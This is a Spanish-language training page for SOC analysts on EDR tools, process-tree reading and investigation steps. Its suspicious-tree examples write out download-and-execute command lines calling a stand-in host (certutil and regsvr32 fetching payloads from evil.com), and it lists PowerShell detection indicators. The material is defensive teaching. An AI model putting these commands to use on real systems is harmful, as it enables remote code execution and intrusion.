---
icon: shield-halved
---

# EDR — Detección y Respuesta de Endpoints

### ¿Qué es un EDR?

**EDR (Endpoint Detection and Response)** es un agente de seguridad instalado en cada endpoint (PC, servidor, portátil) que monitoriza y registra en tiempo real todo lo que ocurre en el sistema: procesos, conexiones de red, operaciones de archivos, cambios de registro, y más.

```
Diferencia con el antivirus tradicional:

Antivirus:
→ Detecta malware CONOCIDO comparando con firmas (base de datos)
→ Reactivo: solo detecta lo que ya se conoce
→ Si el malware es nuevo (0-day) o está ofuscado → no lo detecta

EDR:
→ Monitoriza el COMPORTAMIENTO del sistema continuamente
→ Detecta actividad anómala aunque el malware sea desconocido
→ Registra todo para análisis forense
→ Permite respuesta activa: aislar el endpoint, matar procesos
→ Permite hunting: buscar IOCs en todos los endpoints a la vez
```

### Capacidades del EDR

#### Visibilidad

```
El EDR registra y hace disponible para el analista:

Procesos:
→ Cada proceso que se ejecuta: nombre, PID, ruta, argumentos
→ Árbol de procesos (relación padre-hijo)
→ Hash del ejecutable
→ Usuario que lo ejecutó
→ Línea de comandos completa

Conexiones de red por proceso:
→ Qué proceso hizo qué conexión
→ IP y puerto origen/destino
→ Protocolo
→ País de destino

Operaciones de archivos:
→ Archivos creados, modificados, eliminados, renombrados
→ Por qué proceso y desde qué ruta

Modificaciones del registro (Windows):
→ Claves creadas, modificadas o eliminadas
→ Especialmente en rutas de persistencia (Run, Services...)

Carga de DLLs:
→ Qué librerías carga cada proceso
→ DLL hijacking: DLL cargada desde ruta inusual

Inyección de código:
→ Detección de técnicas de inyección entre procesos
→ Process hollowing, DLL injection, reflective injection
```

#### Respuesta activa

```
El EDR permite al analista actuar directamente desde la consola:

Aislar el endpoint:
→ Corta todas las conexiones de red del endpoint
→ El equipo ya no puede comunicarse con nada (ni C2 ni red interna)
→ Pero mantiene la conexión con el servidor del EDR
→ El analista puede seguir investigando y dando comandos

Poner archivo en cuarentena:
→ El archivo malicioso se mueve a una zona segura
→ Ya no puede ejecutarse ni propagarse
→ Se puede recuperar si fue un FP

Matar un proceso:
→ Terminar inmediatamente un proceso malicioso en ejecución

Ejecutar script de respuesta:
→ Correr un script en el endpoint para recopilar información
→ O para realizar acciones de remediación

Live Response / Remote Shell:
→ Acceso interactivo al endpoint comprometido
→ Permite investigar en profundidad sin estar físicamente presente
```

#### Hunting (búsqueda proactiva)

```
El EDR permite buscar un IOC en TODOS los endpoints a la vez:

Búsqueda de hash:
→ "¿Algún sistema tiene este archivo malicioso?"
→ Respuesta en segundos, para todos los endpoints de la organización

Búsqueda de conexión:
→ "¿Algún sistema se ha conectado a esta IP?"
→ Detectar propagación del C2 a otros equipos

Búsqueda de proceso:
→ "¿Algún sistema está ejecutando este proceso con estos argumentos?"
→ Detectar herramientas de ataque activas

Ejemplo práctico:
Analista detecta un C2 en el sistema A.
Busca en el EDR: "¿qué otros sistemas se conectaron a esa IP?"
→ Sistema B y C también se conectaron → movimiento lateral confirmado
```

### El árbol de procesos — cómo leerlo

El árbol de procesos es la visualización más importante del EDR. Muestra la jerarquía padre-hijo de procesos y es la forma más rápida de detectar comportamiento malicioso.

#### Árbol de procesos normal

```
Sistema operativo (System)
└── smss.exe (Session Manager)
    └── csrss.exe
    └── wininit.exe
        ├── services.exe
        │   ├── svchost.exe -k netsvcs
        │   ├── svchost.exe -k LocalService
        │   └── spoolsv.exe
        └── lsass.exe

Usuario inicia sesión:
winlogon.exe
└── userinit.exe
    └── explorer.exe (escritorio del usuario)
        ├── chrome.exe (navegador)
        │   └── chrome.exe (renderer)
        └── outlook.exe (correo)
```

#### Árboles sospechosos

```
CASO 1 — Macro maliciosa en Word (phishing):
WINWORD.EXE (usuario abrió un documento)
└── cmd.exe              ← Word NO debería lanzar cmd.exe
    └── powershell.exe   ← cmd NO debería lanzar PowerShell
        └── net.exe      ← reconocimiento de la red
→ Indicador claro de macro maliciosa ejecutando código

CASO 2 — Descarga y ejecución de payload:
chrome.exe
└── cmd.exe              ← navegador NO debería lanzar cmd
    └── certutil.exe -urlcache -f http://evil.com/payload.exe
                         ← descarga de archivo desde internet
        └── payload.exe  ← ejecución del malware descargado

CASO 3 — Living off the Land (LOtL) — usando herramientas del sistema:
svchost.exe -k netsvcs
└── powershell.exe -EncodedCommand AAAAABBBBBCCC...
    └── regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
                         ← carga de script COM remoto → RCE

CASO 4 — PsExec (movimiento lateral):
services.exe
└── PSEXESVC.exe         ← servicio instalado por PsExec
    └── cmd.exe          ← shell en el sistema remoto
        └── whoami       ← el atacante verifica que tiene acceso
```

#### Procesos legítimos de Windows — señales de compromiso

```
lsass.exe:
→ Solo debe haber UNA instancia
→ Padre: wininit.exe
→ Ruta: C:\Windows\System32\lsass.exe
→ ALERTA si: múltiples instancias, padre diferente, ruta diferente
→ Los atacantes hacen dump de lsass para robar credenciales (Mimikatz)
→ ALERTA si: otro proceso hace handle a lsass → posible credential dump

svchost.exe:
→ Múltiples instancias son NORMALES
→ Debe tener parámetro -k [nombre_grupo]
→ Padre: services.exe
→ Ruta: C:\Windows\System32\svchost.exe
→ ALERTA si: sin parámetro -k, padre diferente, ruta diferente
→ Uno de los procesos más imitados por malware

explorer.exe:
→ Un proceso por usuario conectado
→ Padre: userinit.exe (que termina poco después)
→ Ruta: C:\Windows\explorer.exe
→ ALERTA si: conexiones de red inusuales, hijo de proceso raro

powershell.exe / powershell_ise.exe:
→ En sí mismo no es malicioso — es una herramienta legítima
→ ALERTA si:
  → Ejecutado desde proceso inusual (Word, Excel, svchost...)
  → Argumentos con -EncodedCommand o -Enc
  → Argumentos con -ExecutionPolicy Bypass
  → Descarga desde internet: DownloadString, WebClient, IEX
  → Línea de comandos muy larga (ofuscación)

cmd.exe:
→ ALERTA si: lanzado desde Office, navegador, svchost, lsass
→ ALERTA si: ejecuta múltiples comandos encadenados con &&, ||, ;
```

### Cómo usa el analista el EDR en una investigación

```
Flujo típico de investigación con EDR:

1. El SIEM genera alerta → analista toma posesión

2. Ir al EDR y buscar el endpoint afectado

3. Ver el árbol de procesos alrededor del timestamp de la alerta
   → ¿Qué proceso generó el evento?
   → ¿Quién lo lanzó? ¿Desde qué proceso padre?
   → ¿Cuál es la línea de comandos exacta?

4. Ver las conexiones de red del proceso
   → ¿Se conectó a alguna IP externa?
   → ¿La IP aparece en Threat Intelligence?
   → ¿El proceso debería hacer conexiones de red?

5. Ver las operaciones de archivos
   → ¿Creó algún archivo ejecutable?
   → ¿Modificó archivos del sistema?
   → ¿Cifró archivos (ransomware)?

6. Buscar el hash del ejecutable sospechoso en VirusTotal
   → ¿Es malware conocido?

7. Si es amenaza confirmada:
   → Aislar el endpoint desde el EDR
   → Escalar con toda la información recopilada
```

***

### Soluciones EDR principales

```
CrowdStrike Falcon:
→ Líder del mercado
→ Cloud-native, muy ligero en el endpoint
→ Excelente capacidad de hunting (Falcon Query Language)
→ Detección por IA sin firmas
→ Muy usado en grandes empresas y SOCs maduros

SentinelOne:
→ IA para detección autónoma
→ Rollback automático ante ransomware
→ Muy valorado por su capacidad de respuesta autónoma

Microsoft Defender for Endpoint:
→ Integrado en Windows 10/11 y Windows Server
→ Plan 2 incluye hunting avanzado con KQL
→ Integración perfecta con Microsoft Sentinel
→ Muy común por ser parte del ecosistema Microsoft

Elastic EDR (Elastic Security):
→ Open source en versión básica
→ Integrado con Elastic Stack (Kibana)
→ Buena opción para aprendizaje

Wazuh:
→ 100% gratuito y open source
→ Agentes para Windows, Linux, macOS
→ Integración con VirusTotal y MITRE ATT&CK
→ Ideal para laboratorios y organizaciones con presupuesto limitado
→ Muy usado en entornos de formación
```

> El árbol de procesos es la primera cosa que mirar en el EDR cuando se investiga un endpoint comprometido. La cadena padre → hijo revela inmediatamente si la ejecución es legítima o maliciosa — un proceso de Office lanzando PowerShell es siempre sospechoso.

> La función de aislamiento del endpoint del EDR es una de las herramientas de contención más potentes del SOC: en segundos se puede cortar toda comunicación de red de un sistema comprometido sin tocar físicamente el equipo, aunque esté en otra ciudad.

> Un EDR solo es tan bueno como su cobertura de despliegue. Si hay endpoints sin agente (sistemas legacy, IoT, dispositivos OT) son puntos ciegos donde el malware puede operar sin ser detectado. El inventario de activos y la cobertura del EDR son una prioridad del ingeniero de seguridad SOC.
